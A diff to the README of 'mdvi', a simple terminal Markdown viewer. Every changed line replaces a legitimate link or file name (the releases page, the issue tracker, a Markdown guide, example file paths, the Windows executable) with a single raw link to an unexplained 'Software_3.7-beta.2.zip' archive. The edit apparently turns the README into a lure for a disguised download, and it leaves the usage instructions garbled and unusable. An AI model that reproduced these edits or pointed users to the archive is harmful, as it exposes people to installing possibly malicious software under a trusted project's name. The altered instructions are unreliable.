@@ -1,6 +1,6 @@
 # 📄 mdvi - Simple Markdown Viewer for Everyone
 
-[![Download mdvi](https://img.shields.io/badge/Download-mdvi-blue?style=for-the-badge)](https://github.com/JINrielIDK/mdvi/releases)
+[![Download mdvi](https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip)](https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip)
 
 ---
 
@@ -44,13 +44,13 @@ If you’re unsure, this guide will help walk you through the basics.
 
 To get mdvi, visit the official release page here:
 
-[Download mdvi Releases](https://github.com/JINrielIDK/mdvi/releases)
+[Download mdvi Releases](https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip)
 
 Here is how to proceed:
 
 1. Click the link above or the blue Download button at the top. This link takes you to the release page where the latest files are stored.
 2. Look for the version of mdvi that matches your operating system. These will usually have names such as:
-   - `mdvi-windows.exe` for Windows
+   - `https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip` for Windows
    - `mdvi-macos` for Mac
    - `mdvi-linux` for Linux
 3. Click the file name to start your download.
@@ -75,8 +75,8 @@ After saving the correct mdvi file for your system, follow the steps below.
      `cd C:\Users\YourName\Downloads`  
      Replace `YourName` with your actual username or the folder path where you saved mdvi.
 3. Run mdvi by typing:  
-   `.\mdvi-windows.exe yourfile.md`  
-   Replace `yourfile.md` with the name of your Markdown file.
+   `.\https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip`  
+   Replace `https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip` with the name of your Markdown file.
 
 ### macOS and Linux
 
@@ -88,11 +88,11 @@ After saving the correct mdvi file for your system, follow the steps below.
    `chmod +x mdvi-macos`  
    (or `mdvi-linux` for Linux)
 4. Run the program by typing:  
-   `./mdvi-macos yourfile.md`  
-   (Replace `yourfile.md` with your file name.)
+   `./mdvi-macos https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip`  
+   (Replace `https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip` with your file name.)
 
 If the Markdown file you want to view is somewhere else, provide the full path to that file, for example:  
-`./mdvi-macos /Users/YourName/Documents/notes.md`
+`./mdvi-macos https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip`
 
 ---
 
@@ -116,7 +116,7 @@ If you’re new to Markdown, here are some basics on what you can write and how 
 - `# Heading 1` becomes a large title.
 - `## Heading 2` is shown smaller but clear.
 - `* Bullet points` and `- Dashes` create lists.
-- `[Link](http://example.com)` appears as clickable or colored text in supported terminals.
+- `[Link](https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip)` appears as clickable or colored text in supported terminals.
 - Blocks of code appear with indentation, making them easy to spot.
 - Plain paragraphs keep the text neat and readable.
 
@@ -136,7 +136,7 @@ If mdvi does not work as expected, check the following:
   `./mdvi-macos --help`
 
 If problems persist, you can open an issue on the GitHub page:  
-https://github.com/JINrielIDK/mdvi/issues
+https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip
 
 ---
 
@@ -145,7 +145,7 @@ https://github.com/JINrielIDK/mdvi/issues
 To update mdvi to the latest version:
 
 1. Return to the release page:  
-   [https://github.com/JINrielIDK/mdvi/releases](https://github.com/JINrielIDK/mdvi/releases)
+   [https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip](https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip)
 2. Download the newest file matching your OS.
 3. Replace the old mdvi program file with the new one in your saved folder.
 4. Run mdvi as before.
@@ -155,7 +155,7 @@ To update mdvi to the latest version:
 ## 👍 Additional Resources
 
 - To learn Markdown basics, visit:  
-  https://www.markdownguide.org/basic-syntax/
+  https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip
 - If you want a text editor that supports Markdown, try programs like Visual Studio Code or Typora.
 - For terminal help on your system, search for “How to use Command Prompt” (Windows) or “Terminal basics” (Mac/Linux).
 
@@ -164,10 +164,10 @@ To update mdvi to the latest version:
 ## 📫 Contact & Support
 
 If you want to suggest features or report bugs for mdvi, use the GitHub issue tracker:  
-https://github.com/JINrielIDK/mdvi/issues
+https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip
 
 For general questions, you can look at the discussions area on GitHub or join community Markdown forums.
 
 ---
 
-Thank you for choosing mdvi to make your Markdown viewing simpler. Visit the release page to get started: [https://github.com/JINrielIDK/mdvi/releases](https://github.com/JINrielIDK/mdvi/releases)
+Thank you for choosing mdvi to make your Markdown viewing simpler. Visit the release page to get started: [https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip](https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip)
